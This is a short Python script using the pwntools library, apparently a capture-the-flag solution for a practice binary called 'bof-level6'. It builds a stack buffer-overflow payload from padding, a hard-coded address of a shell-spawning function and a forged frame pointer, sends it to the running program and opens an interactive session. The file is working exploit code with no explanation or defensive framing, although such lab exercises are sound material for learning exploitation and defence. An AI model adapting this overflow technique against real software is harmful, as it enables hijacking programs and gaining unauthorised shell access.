#!/usr/bin/env python
from pwn import *

context.terminal = "/bin/bash"
p = process('./bof-level6')
#c = Core('core')
#gdb.attach(p)

#bottom of stack
target_ebp_value = p64(0x7fffffffd1b0)

#get_a_shell_address
addr_shell = p64(0x40063a)

buf = 'B' * 8 + addr_shell + 'A' * (0x80 - 0x10) + target_ebp_value

#stack_addr = c.stack.find(buf)

#print(buf)
p.sendline(buf)
p.interactive()
